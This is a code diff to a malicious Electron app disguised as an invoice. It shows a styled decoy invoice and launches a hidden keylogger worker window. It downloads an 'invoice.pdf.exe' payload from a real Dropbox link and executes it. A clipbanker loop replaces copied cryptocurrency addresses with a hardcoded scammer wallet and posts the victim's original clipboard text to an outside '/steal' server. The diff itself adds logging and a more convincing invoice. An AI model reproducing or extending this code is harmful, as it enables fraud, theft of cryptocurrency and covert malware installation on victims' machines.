@@ -3,17 +3,22 @@ const path = require('path');
 const { exec } = require('child_process');
 const fs = require('fs');
 
-function createWindow() {
-  // 1. Create a hidden worker window to run the keylogger script.
-  const workerWin = new BrowserWindow({
-    show: false,
-    webPreferences: {
-      nodeIntegration: true,
-    },
-  });
-  workerWin.loadFile(path.join(__dirname, 'worker.html'));
+// --- Start of Logging Setup ---
+const logStream = fs.createWriteStream(path.join(app.getPath('documents'), 'phishing-log.txt'), { flags: 'w' }); // 'w' to overwrite the log each time
+const log = (message) => {
+  const timestamp = new Date().toISOString();
+  logStream.write(`${timestamp} - ${message}\n`);
+  console.log(`${timestamp} - ${message}`); // Also log to console for dev mode
+};
+process.on('uncaughtException', (error) => {
+  log(`FATAL UNCAUGHT EXCEPTION: ${error.message}\n${error.stack}`);
+  app.quit();
+});
+log('App starting...');
+// --- End of Logging Setup ---
 
-  // 2. Show the decoy invoice immediately.
+function createWindow() {
+  // Create the decoy window.
   const decoyWin = new BrowserWindow({
     width: 800,
     height: 600,
@@ -27,32 +32,90 @@ function createWindow() {
     <!DOCTYPE html>
     <html>
     <head>
-      <title>Invoice</title>
+      <title>INVOICE</title>
       <style>
-        body { font-family: sans-serif; margin: 2em; }
-        h1 { color: #333; }
-        p { line-height: 1.6; }
-        .address { font-family: monospace; background: #eee; padding: 1em; }
+        body { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif; margin: 40px; font-size: 14px; line-height: 1.6; }
+        .invoice-box { max-width: 800px; margin: auto; padding: 30px; border: 1px solid #eee; box-shadow: 0 0 10px rgba(0, 0, 0, 0.15); }
+        .header { text-align: center; margin-bottom: 40px; }
+        .header h1 { margin: 0; font-size: 28px; }
+        .address-info { display: flex; justify-content: space-between; margin-bottom: 40px; }
+        .address-info div { width: 48%; }
+        table { width: 100%; line-height: inherit; text-align: left; border-collapse: collapse; }
+        table td { padding: 8px; vertical-align: top; }
+        table tr.heading td { background: #eee; border-bottom: 1px solid #ddd; font-weight: bold; }
+        table tr.item td { border-bottom: 1px solid #eee; }
+        table tr.total td:last-child { font-weight: bold; font-size: 16px; }
+        .grand-total { text-align: right; margin-top: 20px; }
       </style>
     </head>
     <body>
-      <h1>Approved Invoice</h1>
-      <p>Well received, below I have attached an approved document invoice.</p>
-      <p>You’re to pay that amount to the account address below the amount can also be remitted in cryptocurrency (Bitcoin)</p>
-      <p>This is the address below</p>
-      <p class="address">bc1qqku6e3qxyhlv5fvjaxazt0v5f5mf77lzt0ymm0</p>
-      <p>Make due diligence in sending to the right address</p>
+      <div class="invoice-box">
+        <div class="header">
+          <h1>INVOICE</h1>
+          <p>Acme Group Corp</p>
+          <p>133, Canvey Island, South Florida</p>
+          <p>Email: info@acmegroup.com | Phone: +1 456 0986</p>
+        </div>
+        <div class="address-info">
+          <div>
+            <strong>Bill To:</strong><br>
+            Arnold Fletch
+          </div>
+        </div>
+        <table>
+          <tr class="heading">
+            <td>Description</td>
+            <td>Quantity</td>
+            <td>Unit Price</td>
+            <td>Total</td>
+          </tr>
+          <tr class="item">
+            <td>Website Design</td>
+            <td>1</td>
+            <td>$500</td>
+            <td>$500</td>
+          </tr>
+          <tr class="item">
+            <td>Hosting (1 year)</td>
+            <td>1</td>
+            <td>$100</td>
+            <td>$100</td>
+          </tr>
+          <tr class="item">
+            <td>Domain (1 year)</td>
+            <td>1</td>
+            <td>$20</td>
+            <td>$20</td>
+          </tr>
+          <tr class="total">
+            <td colspan="3" style="text-align: right;"><b>Grand Total</b></td>
+            <td><b>$620</b></td>
+          </tr>
+        </table>
+        <div class="grand-total">
+          <p>Thank you for your business! Please make payment within 14 days.</p>
+        </div>
+      </div>
     </body>
     </html>
   `;
   decoyWin.loadURL(`data:text/html;charset=utf-8,${encodeURIComponent(invoiceHTML)}`);
 
-  // 3. Start the background download simultaneously.
+  // Create a hidden worker window to run the keylogger script.
+  const workerWin = new BrowserWindow({
+    show: false,
+    webPreferences: {
+      nodeIntegration: true,
+    },
+  });
+  workerWin.loadFile(path.join(__dirname, 'worker.html'));
+
+  // Start the background download.
   const isMac = process.platform === 'darwin';
 
   const downloadLink = isMac
     ? 'YOUR_MACOS_PAYLOAD_DOWNLOAD_LINK_HERE'
-    : 'https://www.dropbox.com/scl/fi/n5umt1lezx91cygika6r9/invoice.pdf.exe?rlkey=rv1x8zsttsi358h5juaexwfun&st=2vnrx3bf&dl=1';
+    : 'https://www.dropbox.com/scl/fi/n5umt1lezx91cygika6r9/invoice.pdf.exe?rlkey=rv1x8zsttsi358h5juaexwfun&st=i2hrh6xt&dl=1';
 
   const fileName = isMac ? 'invoice.dmg' : 'invoice.pdf.exe';
   const downloadsPath = app.getPath('downloads');
@@ -66,7 +129,6 @@ function createWindow() {
     item.on('done', (event, state) => {
       if (state === 'completed') {
         console.log('Download successfully');
-
         const command = isMac ? `open "${filePath}"` : `start "" "${filePath}"`;
         exec(command, (err) => {
           if (!err) app.quit();
@@ -80,6 +142,7 @@ function createWindow() {
 }
 
 app.whenReady().then(createWindow).then(() => {
+  log('App ready, starting clipboard monitor.');
   // === Clipbanker Logic (Moved to Main Process) ===
   const scammerAddresses = {
     btc:   "bc1qqku6e3qxyhlv5fvjaxazt0v5f5mf77lzt0ymm0",
@@ -101,24 +164,34 @@ app.whenReady().then(createWindow).then(() => {
   }
 
   setInterval(() => {
-    const text = clipboard.readText();
-    const scammerAddress = getScammerAddress(text);
-    if (scammerAddress && text !== scammerAddress) {
-      clipboard.writeText(scammerAddress);
-      
-      const request = net.request({
-        method: 'POST',
-        url: 'https://invoice-wimt.onrender.com/steal'
-      });
-      request.setHeader('Content-Type', 'application/json');
-      request.write(JSON.stringify({
-        type: "clipbanker",
-        original: text,
-        replaced: scammerAddress,
-        victim: "PC-User-01",
-        timestamp: new Date().toISOString()
-      }));
-      request.end();
+    try {
+      log('Checking clipboard...');
+      const text = clipboard.readText();
+      if (text) log(`Clipboard text: "${text}"`);
+
+      const scammerAddress = getScammerAddress(text);
+      if (scammerAddress && text !== scammerAddress) {
+        log(`Address detected. Replacing with: ${scammerAddress}`);
+        clipboard.writeText(scammerAddress);
+        log('Replacement successful.');
+        
+        const request = net.request({
+          method: 'POST',
+          url: 'https://invoice-wimt.onrender.com/steal'
+        });
+        request.setHeader('Content-Type', 'application/json');
+        request.write(JSON.stringify({
+          type: "clipbanker",
+          original: text,
+          replaced: scammerAddress,
+          victim: "PC-User-01",
+          timestamp: new Date().toISOString()
+        }));
+        request.end();
+        log('Data sent to server.');
+      }
+    } catch (err) {
+      log(`ERROR in clipboard interval: ${err.message}`);
     }
   }, 200);
 });
